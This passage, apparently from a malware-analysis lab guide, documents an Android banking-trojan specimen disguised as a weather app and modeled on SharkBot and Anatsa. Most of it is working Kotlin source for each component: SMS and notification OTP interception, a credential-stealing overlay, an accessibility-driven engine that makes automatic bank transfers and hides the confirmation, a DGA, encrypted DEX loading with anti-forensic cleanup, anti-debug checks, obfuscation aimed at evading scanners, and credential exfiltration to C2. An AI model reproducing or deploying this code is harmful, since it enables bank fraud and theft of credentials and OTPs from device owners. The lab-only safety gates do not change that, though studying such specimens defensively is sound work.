        // Pass 2: 6-digit sequence (most common OTP length) → MEDIUM
        matches.firstOrNull { it.groupValues[1].length == 6 }?.let {
            return ExtractionResult(it.groupValues[1], Confidence.MEDIUM, text.take(100))
        }

        // Pass 3: any 4-8 digit match → LOW
        return ExtractionResult(matches.first().groupValues[1], Confidence.LOW, text.take(100))
    }

    // (2) Multi-match: all potential OTPs from text (SMS may contain multiple)
    fun extractAll(text: String): List<ExtractionResult> {
        return OTP_PATTERN.findAll(text).map { match ->
            val nearbyText = getNearbyText(text.lowercase(), match.range, 30)
            val confidence = when {
                OTP_CONTEXT_KEYWORDS.any { nearbyText.contains(it) } -> Confidence.HIGH
                match.groupValues[1].length == 6 -> Confidence.MEDIUM
                else -> Confidence.LOW
            }
            ExtractionResult(match.groupValues[1], confidence, text.take(100))
        }.toList()
    }
}
```

Shared by all three OTP capture vectors (NLS, SMS, A11y notification events). The 3-pass strategy balances recall vs precision: Pass 1 (HIGH) catches "Your verification code is 482910" with near-certainty, Pass 2 (MEDIUM) catches bare 6-digit sequences that are statistically likely OTPs, Pass 3 (LOW) captures 4-8 digit sequences that might be dates/amounts/noise. The 30-char proximity window for context keyword matching is tuned for typical OTP SMS format ("Your code is 482910" -- keyword "code" appears within 15 chars of digits). The `source` field (truncated to 100 chars) gives the C2 operator context to distinguish real OTP from false positives. CLAUDE.md constraint #5 enforced: no institution-specific patterns, generic numeric extraction only.

### intArrayOf String Encoding — Deep Dive

**Source: AppConfig.kt**
```kotlin
// File: stage-1-evasion/.../AppConfig.kt (actual specimen code)

// KEY INSIGHT: ROT13 of character codes stored as integer arrays
// Not cryptographically meaningful — just enough to defeat string scanning
// AV scanners grep for "http://" — they find intArrayOf(117, 129, 129, 125, ...)

private const val SHIFT = 13

// "http://10.0.2.2:8080/api/v1/beacon"
private val _endpoint = intArrayOf(
    117, 129, 129, 125, 71, 60, 60, 62, 61, 59, 61, 59, 63, 59, 63,
    71, 69, 61, 69, 61, 60, 110, 125, 118, 60, 131, 62, 60, 111,
    114, 110, 112, 124, 123
)

// XOR key for payload: "SkyWeatherSync24" (16 bytes)
val PAYLOAD_KEY = intArrayOf(
    96, 120, 134, 100, 114, 110, 129, 117, 114, 127, 96, 134, 123, 112, 63, 65
)

// "payload.Module" — class to load from decrypted DEX
val PAYLOAD_CLASS = intArrayOf(
    125, 110, 134, 121, 124, 110, 113, 59, 90, 124, 113, 130, 121, 114
)

// Decode: subtract SHIFT from each int -> char
fun decode(encoded: IntArray): String {
    val chars = CharArray(encoded.size)
    for (i in encoded.indices) {
        chars[i] = (encoded[i] - SHIFT).toChar()
    }
    return String(chars)
}
```

**Why this defeats ML:**
1. In bytecode: `SIPUSH 117`, `IASTORE` — integer array initialization. Every app has these.
2. No crypto imports (`javax.crypto`), no S-box patterns, no key schedule computation.
3. No high-entropy byte sequences that trigger packed/encrypted heuristics.
4. Subtraction loop is identical to any app processing sensor data, coordinates, or pixel values.
5. ROT13 specifically chosen: `'h' + 13 = 117`, `'t' + 13 = 129`. Minimal shift, minimal entropy.

### DGA Algorithm — SharkBot V2.8 Shape

**Source: DomainResolver.kt**
```kotlin
// File: stage-1-evasion/.../DomainResolver.kt (actual specimen code)

// SharkBot V2.8 algorithm:
//   seed = TLD + ISO_week_number + calendar_year
//   hash = MD5(seed) -> first 16 hex chars -> domain
//   7 TLDs = 7 candidates per week

fun generateFallbacks(): List<String> {
    val cal = Calendar.getInstance()
    val week = cal.get(Calendar.WEEK_OF_YEAR)    // 1-52
    val year = cal.get(Calendar.YEAR)             // 2026

    val candidates = mutableListOf<String>()
    val seeds = arrayOf("alpha", "bravo", "charlie", "delta")

    for (seed in seeds) {
        // Algorithm: MD5("alpha192026") -> hex -> octets -> RFC1918 address
        val input = "$seed$week$year"
        val hash = md5Hex(input)

        // Lab constraint: hash bytes -> 10.x.y.z (RFC1918)
        // Real SharkBot: hash[:16] + ".xyz" -> public domain
        val octets = hashToOctets(hash)
        val port = PORTS[hash.hashCode().and(0x7FFFFFFF) % PORTS.size]

        val endpoint = "http://10.${octets[0]}.${octets[1]}.${octets[2]}:$port/api/v1/beacon"
        candidates.add(endpoint)
    }
    return candidates  // 4 candidates per week, rotating
}

// Endpoint resolution: primary -> DGA fallbacks
fun resolveEndpoint(): String? {
    val primary = AppConfig.endpoint()
    if (isReachable(primary)) return primary

    val fallbacks = generateFallbacks()
    for (candidate in fallbacks) {
        if (!isRfc1918(candidate)) continue  // Defense-in-depth safety gate
        if (isReachable(candidate)) return candidate
    }
    return null  // All endpoints unreachable -> go silent
}
```

**Defender precomputation leverage:** Same algorithm shape as real SharkBot. Defender knows seeds + algorithm = precompute every future week's candidates. For SharkBot V2.8 (7 TLDs): `7 candidates/week * 52 weeks = 364 domains/year`. Sinkhole the set before the week begins.

### Payload Pipeline — 4-Stage Anatsa Architecture

**Source: PayloadManager.kt**
```kotlin
// File: stage-1-evasion/.../PayloadManager.kt (actual specimen code)

// Full pipeline: download -> decrypt -> load -> execute -> cleanup
fun deliverAndExecute(context: Context): String? {
    if (!AppConfig.isEndpointSafe()) return null  // Safety gate

    val encryptedFile = download(context) ?: return null
    val decryptedFile = decrypt(encryptedFile, context) ?: return null
    val result = loadAndExecute(decryptedFile, context)
    cleanup(encryptedFile, decryptedFile)  // Anti-forensics
    return result
}

// Stage 2b: XOR decrypt (NOT AES — ML-invisible)
private fun decrypt(encryptedFile: File, context: Context): File? {
    val encrypted = encryptedFile.readBytes()
    val key = AppConfig.payloadKey()  // "SkyWeatherSync24" decoded from intArrayOf
    val decrypted = ByteArray(encrypted.size)
    for (i in encrypted.indices) {
        decrypted[i] = (encrypted[i].toInt() xor key[i % key.size].toInt()).toByte()
    }
    // Verify DEX magic bytes before loading
    if (decrypted[0] != 0x64.toByte() ||  // 'd'
        decrypted[1] != 0x65.toByte() ||  // 'e'
        decrypted[2] != 0x78.toByte()     // 'x'
    ) return null
    // ...
}

// Stage 2c: DexClassLoader + reflective dispatch
private fun loadAndExecute(dexFile: File, context: Context): String? {
    val classLoader = dalvik.system.DexClassLoader(
        dexFile.absolutePath,
        optimizedDir.absolutePath,
        null,
        context.classLoader
    )
    // Class name decoded at runtime from intArrayOf:
    val className = AppConfig.decode(AppConfig.PAYLOAD_CLASS)  // "payload.Module"
    val payloadClass = classLoader.loadClass(className)
    val instance = payloadClass.getDeclaredConstructor().newInstance()
    val methodName = AppConfig.decode(AppConfig.PAYLOAD_METHOD) // "execute"
    val method = payloadClass.getMethod(methodName, Any::class.java)
    val result = method.invoke(instance, context)
    return result as? String
}

// Stage 2d: Anti-forensics — delete payload from disk
// DEX exists only in memory after this point. Disk forensics finds nothing.
private fun cleanup(vararg files: File?) {
    for (file in files) { file?.delete() }
    // Also clean OAT cache (optimized DEX output)
    File(files.firstOrNull()?.parentFile, ".oat_cache")
        .listFiles()?.forEach { it.delete() }
}
```

**Anti-forensics timeline:**
```
T+0.0s  GET /api/v1/payload -> write .cache_data (encrypted)
T+0.1s  XOR decrypt -> write .update_cache.dex
T+0.2s  DexClassLoader loads .update_cache.dex into memory
T+0.3s  delete .cache_data + .update_cache.dex + .oat_cache/*
T+0.3s+ Payload class only exists in DexClassLoader's memory map
        Disk forensics: nothing. Must capture via Frida hook or memory dump.
```

### ATS Engine — Automatic Transfer System (Stage 4)

The terminal capability. Stages 1-3 (evasion + credential capture + OTP intercept) feed Stage 4: automated fraudulent transfers.

**Source: AtsEngine.kt — state machine**
```kotlin
// File: stage-1-evasion/.../core/AtsEngine.kt (actual specimen code)

// State machine: IDLE → ARMED → EXECUTING → COMPLETED/ABORTED
enum class State {
    IDLE,       // No commands loaded
    ARMED,      // Commands loaded, waiting for target app foreground
    EXECUTING,  // Actively processing command queue
    COMPLETED,  // All commands executed successfully
    ABORTED     // Execution failed or timed out
}

// C2 pushes command sequence → engine arms → target app opens → execution begins
fun loadCommands(commands: List<AtsCommand>) {
    commandQueue.clear()
    commandQueue.addAll(commands)
    state = State.ARMED      // Waiting for target foreground
    actionsExecuted = 0
}

fun onTargetForegrounded(packageName: String) {
    if (state != State.ARMED) return
    if (!AppConfig.isEndpointSafe()) return  // Safety gate
    state = State.EXECUTING
    executionStartMs = System.currentTimeMillis()
    handler.postDelayed({ executeNextCommand() }, 1500L)  // Wait for app render
}
```

**10 ATS command types:**

| Command | Action | Banking App Context |
|---|---|---|
| `wait_screen` | Verify expected screen by text patterns | Wait for "Transfer" page to render |
| `set_text` | Fill field by view ID | Enter amount: "500.00" |
| `click` | Tap button by view ID | Click "Continue" |
| `click_text` | Tap element by visible text | Click "Confirm Transfer" (dynamic IDs) |
| `auto_fill_otp` | Fill OTP from CredentialStore | Stage 3→4 bridge — intercepted OTP |
| `scroll` | Scroll container (forward/backward) | Reveal hidden form fields |
| `press_back` | Navigate back | Dismiss dialogs |
| `press_home` | Exit to launcher | **Hide confirmation screen from user** |
| `wait` | Static delay (ms) | Wait for bank's loading spinner |
| `read_screen` | Capture all screen text | Live intelligence for C2 operator |

**Core execution loop:**
```kotlin
// File: stage-1-evasion/.../core/AtsEngine.kt (actual specimen code)

private fun executeNextCommand() {
    if (!AppConfig.isEndpointSafe()) { abort("gate_failed"); return }

    // 60-second ceiling — real SharkBot: 8-15s typical transfer
    if (System.currentTimeMillis() - executionStartMs > 60_000L) {
        abort("timeout"); return
    }

    val command = commandQueue.poll()
    if (command == null) { complete(); return }  // All commands processed

    val root = service.rootInActiveWindow
    if (root == null) {
        commandQueue.add(command)  // Screen not readable — retry
        handler.postDelayed({ executeNextCommand() }, 500L)
        return
    }

    val success = executeCommand(command, root)
    root.recycle()

    if (success) {
        actionsExecuted++
        val delay = injector.nextJitterMs()  // Herodotus jitter: 300-3000ms
        handler.postDelayed({ executeNextCommand() }, delay)
    } else {
        if (command.retries < 3) {           // 3 retries per command
            command.retries++
            commandQueue.add(command)
            handler.postDelayed({ executeNextCommand() }, 1000L)
        } else {
            abort("action_failed:${command.action}")
        }
    }
}
```

**auto_fill_otp — the Stage 3→4 bridge:**
```kotlin
// File: stage-1-evasion/.../core/AtsEngine.kt (actual specimen code)

"auto_fill_otp" -> {
    // Stage 3 captured OTP codes are buffered in CredentialStore.
    // ATS queries for latest OTP-typed entry, auto-fills banking verification field.
    // Real SharkBot: SMS → OTP extracted → auto-filled within 2-5 seconds.
    val targetId = cmd.targetId ?: return false
    val otp = findLatestOtp()
    if (otp != null) {
        val node = ScreenReader.findNodeById(root, targetId)
        if (node != null) {
            val result = injector.setText(node, otp)
            node.recycle()
            result
        } else false
    } else false  // OTP not yet captured — retry (NLS/SMS may deliver shortly)
}

private fun findLatestOtp(): String? {
    val pending = CredentialStore.peekAll()
    return pending.filter { it.eventType.startsWith("otp") }
                  .maxByOrNull { it.timestamp }?.text
}
```

This is the cross-stage wiring: NLS/SMS/A11y capture OTP (Stage 3) → CredentialStore buffer → ATS reads OTP → injects into bank's verification field (Stage 4). The entire sequence is automated — no human operator needed after C2 pushes the command config.

**C2 command JSON protocol:**
```json
{"ats_commands": [
  {"action":"wait_screen","patterns":["Transfer"]},
  {"action":"set_text","target_id":"amount","value":"500.00"},
  {"action":"set_text","target_id":"iban","value":"DE89370400440532013000"},
  {"action":"click","target_id":"continue"},
  {"action":"wait_screen","patterns":["code","verification"]},
  {"action":"auto_fill_otp","target_id":"otp_field"},
  {"action":"click","target_id":"confirm"},
  {"action":"press_home"}
]}
```

Real Anatsa: C2 pushes per-bank command profiles. Operator reverse-engineers target banking app UI, records exact view IDs and screen transition patterns, encodes as command JSON. Different bank = different command set, pushed dynamically.

### GestureInjector — 3 Injection Paths

**Source: GestureInjector.kt**
```kotlin
// File: stage-1-evasion/.../core/GestureInjector.kt (actual specimen code)

// PATH 1: AccessibilityNodeInfo.performAction() — most reliable
// Works on any node the A11y framework can resolve by ID or text.

fun clickNode(node: AccessibilityNodeInfo): Boolean {
    return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
}

// setText: 3-step for reliability (focus → clear → set)
// Real SharkBot: clears field first to prevent partial injection.
fun setText(node: AccessibilityNodeInfo, text: String): Boolean {
    node.performAction(AccessibilityNodeInfo.ACTION_FOCUS)             // Step 1: focus
    val clearBundle = Bundle().apply {
        putCharSequence(ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, "")
    }
    node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, clearBundle)  // Step 2: clear
    val textBundle = Bundle().apply {
        putCharSequence(ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
    }
    return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, textBundle) // Step 3: set
}
```

```kotlin
// PATH 2: AccessibilityService.dispatchGesture() — coordinate-based
// Used for custom views, WebView, Canvas-rendered banking UIs
// where AccessibilityNodeInfo resolution fails.

fun tapAt(x: Float, y: Float, callback: GestureResultCallback? = null) {
    val path = Path().apply { moveTo(x, y); lineTo(x, y) }  // Zero-length = tap
    val gesture = GestureDescription.Builder()
        .addStroke(GestureDescription.StrokeDescription(path, 0L, 50L))  // 50ms tap
        .build()
    service.dispatchGesture(gesture, callback, null)
}

fun swipe(startX: Float, startY: Float, endX: Float, endY: Float,
          durationMs: Long = 300L, callback: GestureResultCallback? = null) {
    val path = Path().apply { moveTo(startX, startY); lineTo(endX, endY) }
    val gesture = GestureDescription.Builder()
        .addStroke(GestureDescription.StrokeDescription(path, 0L, durationMs))
        .build()
    service.dispatchGesture(gesture, callback, null)
}
```

```kotlin
// PATH 3: AccessibilityService.performGlobalAction() — system navigation

fun pressBack(): Boolean =
    service.performGlobalAction(GLOBAL_ACTION_BACK)

fun pressHome(): Boolean =
    service.performGlobalAction(GLOBAL_ACTION_HOME)

fun openNotifications(): Boolean =
    service.performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
```

**Herodotus timing jitter:**
```kotlin
// File: stage-1-evasion/.../core/GestureInjector.kt (actual specimen code)

private val jitterMinMs = 300L
private val jitterMaxMs = 3000L

// Uniform distribution — defeats basic timing analysis,
// but detectable by BioCatch/Trusteer (human timing is log-normal, not uniform)
fun nextJitterMs(): Long = Random.nextLong(jitterMinMs, jitterMaxMs + 1)
```

Detection: `uniform(300, 3000)` is the original Herodotus distribution. BioCatch + IBM Trusteer (Mar-Apr 2026) detect it with 78-92% accuracy. Counter: Apex-class per-target adaptive timing with ML-generated distributions that match the target bank's user population.

### DeviceProfile — Hardware-Metric Anti-Sandbox + Anti-Debug

**Source: DeviceProfile.kt**
```kotlin
// File: stage-1-evasion/.../core/DeviceProfile.kt (actual specimen code)

// HARDWARE METRICS — not Build props, not strings. Physics.
// 5 checks, threshold 3/5 — tolerates edge cases (tablet without SIM, etc.)

fun isRealEnvironment(context: Context): Boolean {
    var score = 0
    if (hasRealAccelerometer(context)) score++  // Sensor exists + resolution > 0
    if (hasRealisticBattery(context)) score++    // Not flat 50%, energy counter != 0
    if (hasSimCard(context)) score++             // SIM_STATE_READY
    if (hasMultipleCameras(context)) score++     // ≥2 cameras (reflection, no import)
    if (hasGyroscope(context)) score++           // Many emulator images lack gyro
    return score >= 3
}
```

Why hardware metrics > Build props:
- `Build.FINGERPRINT.contains("generic")` — every AV signatures this. 2015 technique.
- Accelerometer micro-fluctuations from hand tremor + Earth's gravity = can't be cheaply faked
- Battery energy counter: emulators return 0 or -1. Real devices report actual microjoules.
- Camera count via **reflection** (`javaClass.getMethod("getCameraIdList")`) — no Camera import in dependency graph

**Anti-debug — 3 orthogonal vectors:**
```kotlin
// File: stage-1-evasion/.../core/DeviceProfile.kt (actual specimen code)

fun isUnderInspection(): Boolean {
    return isJavaDebuggerAttached() ||    // Debug.isDebuggerConnected()
            isNativeTracerAttached() ||    // /proc/self/status TracerPid != 0
            isTimingAnomalous()            // Tight loop > 50ms = breakpoint
}

// Timing probe — 1000-iteration loop runs in <1ms normally.
// With debugger breakpoints: 50ms+.
private fun isTimingAnomalous(): Boolean {
    val start = System.nanoTime()
    var accumulator = 0L
    for (i in 0 until 1000) {
        accumulator += i * 31L
        accumulator = accumulator xor (accumulator shr 3)
    }
    val elapsed = System.nanoTime() - start
    @Suppress("UNUSED_VARIABLE") val sink = accumulator  // Prevent dead-code elimination
    return elapsed > 50_000_000L  // 50ms threshold
}
```

TracerPid check catches Frida (ptrace), strace, gdb. Timing probe catches single-step debugging. If ANY fires → specimen goes dormant. Analyst sees weather app only.

### RuntimeBridge — Reflective API Resolution (PEB-Walk Equivalent)

**Source: RuntimeBridge.kt**
```kotlin
// File: stage-1-evasion/.../core/RuntimeBridge.kt (actual specimen code)

// Android PEB-walk: Class.forName() + getMethod() + invoke()
// No static import = no ML feature on import graph.
// 40%+ Android apps use reflection → not a distinguishing ML signal.

// Resolve system service by encoded name — no string constant in DEX
fun getService(context: Context, encodedServiceName: IntArray): Any? {
    return try {
        val serviceName = AppConfig.decode(encodedServiceName)
        val methodName = AppConfig.decode(AppConfig.GET_SYSTEM_SERVICE)
        val method = context.javaClass.getMethod(methodName, String::class.java)
        method.invoke(context, serviceName)
    } catch (_: Exception) { null }
}

// Resolve class by encoded name — no direct Class reference
fun resolveClass(encodedClassName: IntArray): Class<*>? {
    return try { Class.forName(AppConfig.decode(encodedClassName)) }
    catch (_: Exception) { null }
}

// Read static field from reflected class — e.g., Build.MODEL without importing Build
fun readStaticField(encodedClassName: IntArray, encodedFieldName: IntArray): Any? {
    val cls = resolveClass(encodedClassName) ?: return null
    val fieldName = AppConfig.decode(encodedFieldName)
    return cls.getField(fieldName).get(null)
}

// Convenience: Build.MODEL via full reflection chain
fun getDeviceModel(): String {
    return readStaticField(AppConfig.BUILD_CLASS, AppConfig.MODEL_FIELD) as? String ?: "unknown"
}
```

Three ML evasion layers stack: (1) `AppConfig.decode()` — class/method names in intArrayOf, not strings; (2) `Class.forName()` — no static import, no class dependency edge; (3) `getMethod().invoke()` — no direct method call in bytecode. Result: `android.os.Build` never appears in import table, method graph, or string pool. ML sees generic reflection patterns identical to Firebase Analytics, Gson, Dagger.

### SyncTask — 5-Phase Exfil Worker

**Source: SyncTask.kt (205 lines)**
```kotlin
// File: stage-1-evasion/.../core/SyncTask.kt (actual specimen code)

class SyncTask(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        if (!AppConfig.isEndpointSafe()) return Result.failure()  // Safety gate

        return try {
            // (1) Phase 1: Beacon — device fingerprint to C2
            val payload = buildPayload()
            val endpoint = DomainResolver.resolveEndpoint()
                ?: return Result.failure()

            transmit(endpoint, payload)

            // (2) Phase 2: Payload delivery — Anatsa Stage 2→3→4
            val reconData = PayloadManager.deliverAndExecute(applicationContext)

            // (3) Phase 3: Exfil recon results
            if (reconData != null) {
                transmit(endpoint, reconData.toByteArray(Charsets.UTF_8))
            }

            // (4) Phase 4: Start periodic config refresh (Anatsa Stage 3)
            UpdateChannel.schedulePeriodicRefresh(applicationContext)

            // (5) Phase 5: Drain captured credentials
            if (CredentialStore.hasPending()) {
                val credPayload = CredentialStore.toJsonPayload()
                if (credPayload.isNotEmpty()) {
                    transmit(endpoint, credPayload)
                }
            }

            Result.success()
        } catch (_: Exception) {
            Result.failure()  // Silent — no retry, no logging
        }
    }
}
```

Five phases compose the full Anatsa kill-chain execution in a single WorkManager invocation: (1) beacon establishes C2 contact; (2) PayloadManager downloads + decrypts + loads Stage 2 DEX; (3) recon results from payload execution ship back; (4) UpdateChannel starts 15-minute periodic config refresh; (5) CredentialStore buffer drains for any A11y/NLS/SMS-captured credentials. All via `HttpURLConnection` (stdlib, not OkHttp) with manual JSON construction -- zero additional ML-detectable library dependencies.

**Scheduling variants:**
```kotlin
// Standard: 5-second delay, KEEP policy (don't duplicate)
fun scheduleOnce(context: Context) {
    val request = OneTimeWorkRequestBuilder<SyncTask>()
        .setInitialDelay(5, TimeUnit.SECONDS)
        .addTag("weather_sync")                       // Camouflage tag
        .build()
    WorkManager.getInstance(context).enqueueUniqueWork(
        "weather_data_initial_sync",                  // Camouflage name
        ExistingWorkPolicy.KEEP, request
    )
}

// Urgent: 1-second delay, REPLACE policy — OTP codes expire in 30-120s
fun scheduleUrgent(context: Context) {
    val request = OneTimeWorkRequestBuilder<SyncTask>()
        .setInitialDelay(1, TimeUnit.SECONDS)
        .addTag("weather_alert")
        .build()
    WorkManager.getInstance(context).enqueueUniqueWork(
        "weather_alert_push",                         // Separate work name
        ExistingWorkPolicy.REPLACE, request           // Latest trigger wins
    )
}
```

The dual-scheduling pattern mirrors real banker operations: standard beacon for non-urgent data, urgent exfil for time-sensitive OTP codes. REPLACE policy on urgent ensures two rapid OTP captures don't queue two separate workers -- the second replaces the first's pending work, but both OTPs are already in CredentialStore regardless. Work names use weather-app camouflage ("weather_data_initial_sync", "weather_alert_push") -- analyst scanning `dumpsys jobscheduler` sees normal-looking background tasks.

### OverlayRenderer — TYPE_ACCESSIBILITY_OVERLAY (2032) Credential Capture

**Source: OverlayRenderer.kt (264 lines)**
```kotlin
// File: stage-1-evasion/.../core/OverlayRenderer.kt (actual specimen code)

class OverlayRenderer(private val service: AccessibilityService) {

    private val windowManager: WindowManager =
        service.getSystemService(AccessibilityService.WINDOW_SERVICE) as WindowManager

    // (1) Show overlay — the core banker attack surface
    fun showOverlay(targetPackage: String) {
        if (isShowing) return
        triggeredByPackage = targetPackage

        val view = buildOverlayView()

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            // (2) THE critical window type: 2032 = TYPE_ACCESSIBILITY_OVERLAY
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )

        try {
            windowManager.addView(view, params)
            overlayView = view
            isShowing = true
            // (3) Remove NOT_FOCUSABLE to allow credential input
            params.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            windowManager.updateViewLayout(view, params)
        } catch (_: Exception) {
            isShowing = false
        }
    }
}
```

The two-step `addView` → `updateViewLayout` flag swap is operationally critical: initial `FLAG_NOT_FOCUSABLE` prevents the overlay from stealing focus during the transition animation (which would cause a visible flicker). After the view is laid out, removing `NOT_FOCUSABLE` allows the fake input fields to receive keyboard focus. This is the same technique real Anatsa uses.

**Credential capture via onClick:**
```kotlin
// File: stage-1-evasion/.../core/OverlayRenderer.kt (actual specimen code)

// "Continue" button onClick — captures typed credentials
setOnClickListener {
    val username = usernameField.text?.toString() ?: ""
    val password = passwordField.text?.toString() ?: ""

    if (username.isNotEmpty()) {
        CredentialStore.capture(CapturedEvent(
            packageName = triggeredByPackage,   // Attribution to target bank
            viewId = "overlay_username",
            text = username,
            timestamp = System.currentTimeMillis(),
            eventType = "overlay_usr"
        ))
    }
    if (password.isNotEmpty()) {
        CredentialStore.capture(CapturedEvent(
            packageName = triggeredByPackage,
            viewId = "overlay_password",
            text = password,
            timestamp = System.currentTimeMillis(),
            eventType = "overlay_pwd"
        ))
    }

    dismiss()
    SyncTask.scheduleUrgent(service.applicationContext)  // Immediate exfil
}
```

No XML layouts -- the entire overlay is built programmatically in `buildOverlayView()` to avoid `overlay_login.xml` appearing in the APK's resource table (instant analyst red flag). Generic "Security Verification" text per CLAUDE.md constraint #5 -- real Anatsa downloads per-target HTML overlay templates from C2 with pixel-perfect bank branding. `triggeredByPackage` attribution lets the C2 operator know which banking app the credentials belong to.

### UpdateChannel (stage-1-evasion) — Periodic Config Rotation

**Source: UpdateChannel.kt (stage-1-evasion, 183 lines)**
```kotlin
// File: stage-1-evasion/.../core/UpdateChannel.kt (actual specimen code)

class UpdateChannel(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        if (!AppConfig.isEndpointSafe()) return Result.failure()

        val endpoint = DomainResolver.resolveEndpoint() ?: return Result.retry()
        val configUrl = endpoint.replace("/beacon", "/config")
        val config = fetchConfig(configUrl) ?: return Result.retry()
        applyConfig(config)
        return Result.success()
    }

    // (1) Config application — 4 control surfaces from C2 JSON
    private fun applyConfig(json: String) {
        // Kill switch — operator remote disable
        if (json.contains("\"kill\":true")) {
            WorkManager.getInstance(applicationContext)
                .cancelUniqueWork(WORK_NAME)
            return
        }

        // (2) Target list update — banking apps to overlay
        val targetMatch = Regex("\"target_list\":\"([^\"]+)\"").find(json)
        if (targetMatch != null) {
            applicationContext.getSharedPreferences("weather_sync", 0)
                .edit().putString("target_list", targetMatch.groupValues[1]).apply()
        }

        // (3) ATS command delivery — per-bank automation sequences
        val atsMatch = Regex("\"ats_commands\":\\s*(\\[[^\\]]+\\])").find(json)
        if (atsMatch != null) {
            applicationContext.getSharedPreferences("weather_sync", 0)
                .edit().putString("ats_commands", atsMatch.groupValues[1]).apply()
        }

        // (4) Payload URL rotation — mid-campaign DEX swap
        val urlMatch = Regex("\"payload_url\":\"([^\"]+)\"").find(json)
        if (urlMatch != null) {
            val newUrl = urlMatch.groupValues[1]
            if (isRfc1918Host(newUrl)) {  // Safety gate on rotated URLs
                applicationContext.getSharedPreferences("weather_sync", 0)
                    .edit().putString("rotated_payload_url", newUrl).apply()
            }
        }
    }

    companion object {
        // 15-minute interval = WorkManager floor = Anatsa cadence
        fun schedulePeriodicRefresh(context: Context) {
            val request = PeriodicWorkRequestBuilder<UpdateChannel>(
                15, TimeUnit.MINUTES
            ).addTag("weather_refresh").build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "weather_background_refresh",
                ExistingPeriodicWorkPolicy.KEEP, request
            )
        }
    }
}
```

Four C2 control surfaces from a single periodic worker: kill switch (operator shutdown), target list rotation (expand/contract overlay scope), ATS command delivery (per-bank automation sequences stored in SharedPreferences for `AccessibilityEngine` to consume), and payload URL rotation (mid-campaign DEX source swap). Config stored in `SharedPreferences("weather_sync")` -- the same prefs file `AccessibilityEngine.loadTargetList()` and `loadAtsCommands()` read from, creating a C2-to-A11y pipeline through persistent storage. Regex-based JSON parsing avoids Gson/Moshi library dependency. `isRfc1918Host()` validation on rotated payload URLs is defense-in-depth per CLAUDE.md Gate 3.

### C2 Protocol

```
# Periodic beacon (WorkManager, 15-min interval)
POST /api/v1/beacon HTTP/1.1
Host: 10.0.2.2:8080 (or DGA-resolved 10.x.y.z:port)
Content-Type: application/json

{
  "bot_id": "<device_fingerprint>",
  "sync_state": { "credentials": 3, "otp": 1, "events": 12 },
  "config_version": "2026-W19",
  "ts": 1715443200000
}

# Config fetch
GET /api/v1/config HTTP/1.1

-> Response:
{
  "targets": ["com.bank.app1", "com.bank.app2"],
  "overlay_enabled": true,
  "ats_enabled": false,
  "kill_switch": false,
  "payload_url": "http://10.0.2.2:8080/api/v1/payload"
}

# Payload delivery (only if config.payload_url set)
GET /api/v1/payload HTTP/1.1

-> Response: XOR-encrypted DEX bytes
```

### Camouflage Depth

- 6 weather utility classes: `AirQualityIndex`, `AlertManager`, `MoonPhase`, `PollenForecast`, `SunCalculator`, `WeatherHistory`
- Widget: `WeatherWidgetProvider` with real widget layout
- Models: `City`, `ForecastItem`, `WeatherData`
- Adapters: `CityAdapter`, `ForecastAdapter`
- 5 UI activities: Main, Forecast, Settings, Search, About
- Utilities: `DateUtils`, `LocationHelper`, `PrefsManager`, `ThemeEngine`, `UnitConverter`, `WeatherUtils`

---

## Cross-Specimen Attack Surface Matrix

| Capability | SMS-Stealer | Dropper | Overlay-Banker | SkyWeather |
|---|---|---|---|---|
| SMS Read (ContentResolver) | **Yes** | -- | **Yes** | **Yes** |
| SMS Receive (BroadcastReceiver) | -- | -- | **Yes** | **Yes** |
| AccessibilityService | -- | -- | **Yes** | **Yes** |
| NotificationListenerService | -- | -- | **Yes** | **Yes** |
| Overlay Rendering | -- | -- | **Yes** (5 types) | **Yes** |
| ATS (Automatic Transfer) | -- | -- | -- | **Yes** |
| DGA (Domain Generation) | -- | -- | **Yes** | **Yes** |
| DexClassLoader | -- | -- | **Yes** | **Yes** |
| NFC Relay | -- | -- | **Yes** | -- |
| Hidden VNC | -- | -- | **Yes** | -- |
| Residential Proxy | -- | -- | **Yes** | -- |
| Payload Delivery | -- | **Yes** | **Yes** | **Yes** |
| Anti-Debug | -- | -- | **Yes** | **Yes** |
| Anti-Emulator | -- | -- | **Yes** | **Yes** |
| Anti-Frida | -- | -- | **Yes** | **Yes** |
| String Obfuscation | Partial (resources) | Partial (resources) | **Yes** (XOR+AES) | **Yes** (intArrayOf) |
| C2 Exfiltration | **Yes** (HttpURLConn) | **Yes** (HttpURLConn) | **Yes** (OkHttp) | **Yes** (HttpURLConn) |
| Boot Persistence | **Yes** | -- | **Yes** | **Yes** |
| FG Service Persistence | **Yes** | **Yes** | **Yes** | -- |
| WorkManager Beacon | -- | -- | **Yes** | **Yes** |
| SMS Worm Spreading | -- | -- | **Yes** | -- |
| Contact Harvesting | -- | -- | **Yes** | -- |
| SSO/MFA Auto-Approve | -- | -- | **Yes** | -- |
| Yamux Multiplexing | -- | -- | **Yes** | -- |

---

## Progression Map — Analyst Study Order

```
                    SINGLE-SURFACE
                    sms-stealer
                    (ContentResolver + HTTP POST + persistence)
                         |
                         v
                    DELIVERY-CHAIN
                    dropper
                    (config-check + payload-download + resource externalization)
                         |
                         v
                    MULTI-SURFACE
                    overlay-banker
                    (A11y + Overlay + NLS + SMS + C2 commands + frontier modules)
                         |
                         v
                    CAPSTONE
                    stage-1-evasion
                    (DGA + DCL + XOR payload + intArrayOf encoding + ATS)
```

Each specimen builds on the previous. SMS-stealer teaches data collection + exfil. Dropper teaches delivery. Overlay-banker combines all stealer surfaces + C2 command protocol. SkyWeather adds evasion sophistication + payload pipeline + ATS. Analyst working through all 4 covers every primitive in the 2025-2026 banker playbook.

---

## VT Evasion Summary

